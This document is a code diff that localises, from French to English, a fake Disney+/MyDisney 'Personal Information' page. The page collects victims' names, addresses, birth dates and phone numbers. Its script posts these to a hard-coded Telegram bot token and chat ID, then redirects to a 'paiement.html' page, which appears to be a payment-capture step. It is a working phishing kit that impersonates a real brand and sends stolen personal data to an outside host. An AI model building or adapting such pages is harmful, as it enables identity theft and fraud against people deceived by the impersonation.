@@ -1,51 +1,58 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Informations personnelles | Disney+</title>
-  <!-- CSS commun -->
+  <title>Personal Information | Disney+</title>
   <link rel="stylesheet" href="style.css"/>
+  <style>
+    h1 {
+      font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+      font-size: 2rem;
+      text-align: center;
+      margin: 40px 0 20px;
+      color: #1c1c1c;
+    }
+  </style>
 </head>
 <body class="page-form">
   <main>
     <!-- Logo MyDisney -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Informations personnelles</h1>
+    <h1>Personal Information</h1>
 
     <form id="infoForm">
-      <input type="text" placeholder="Nom" required/>
-      <input type="text" placeholder="Prénom" required/>
-      <input type="text" placeholder="Adresse" required/>
-      <input type="text" placeholder="Ville" required/>
-      <input type="text" placeholder="Code postal" required/>
+      <input type="text" placeholder="Last Name" required/>
+      <input type="text" placeholder="First Name" required/>
+      <input type="text" placeholder="Address" required/>
+      <input type="text" placeholder="City" required/>
+      <input type="text" placeholder="Postal Code" required/>
       <select required>
-        <option value="" disabled selected>Pays</option>
+        <option value="" disabled selected>Country</option>
         <option value="FR">France</option>
-        <option value="BE">Belgique</option>
-        <option value="CH">Suisse</option>
-        <option value="ES">Espagne</option>
+        <option value="BE">Belgium</option>
+        <option value="CH">Switzerland</option>
+        <option value="ES">Spain</option>
       </select>
 
-      <!-- Champ date de naissance -->
       <input
         type="text"
         name="nacimiento"
-        placeholder="Date de naissance"
+        placeholder="Date of Birth"
         min="1900-01-01"
         max="2025-12-31"
         required
       />
 
-      <input type="tel" placeholder="Téléphone" required/>
-      <button type="submit">Continuer</button>
+      <input type="tel" placeholder="Phone Number" required/>
+      <button type="submit">Continue</button>
     </form>
 
-    <!-- Note + logos partenaires -->
+    <!-- Note + partner logos -->
     <div class="footer-note">
-      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
-      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus</a>.
+      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
+      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -83,22 +90,22 @@
       const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chat  = "-4970333928";
       const msg   =
-        `📋 Informations personnelles :\n` +
-        `Nom : ${data.nom}\n` +
-        `Prénom : ${data.prenom}\n` +
-        `Adresse : ${data.adresse}\n` +
-        `Ville : ${data.ville}\n` +
-        `Code postal : ${data.cp}\n` +
-        `Pays : ${data.pays}\n` +
-        `Date de naissance : ${data.naissance}\n` +
-        `Téléphone : ${data.telephone}`;
+        `📋 Personal Information:\n` +
+        `Last Name: ${data.nom}\n` +
+        `First Name: ${data.prenom}\n` +
+        `Address: ${data.adresse}\n` +
+        `City: ${data.ville}\n` +
+        `Postal Code: ${data.cp}\n` +
+        `Country: ${data.pays}\n` +
+        `Date of Birth: ${data.naissance}\n` +
+        `Phone Number: ${data.telephone}`;
 
       fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chat, text: msg })
       })
-      .catch(err => console.error("Erreur Telegram :", err))
+      .catch(err => console.error("Telegram Error:", err))
       .finally(() => {
         setTimeout(() => window.location.href = "paiement.html", 2500);
       });
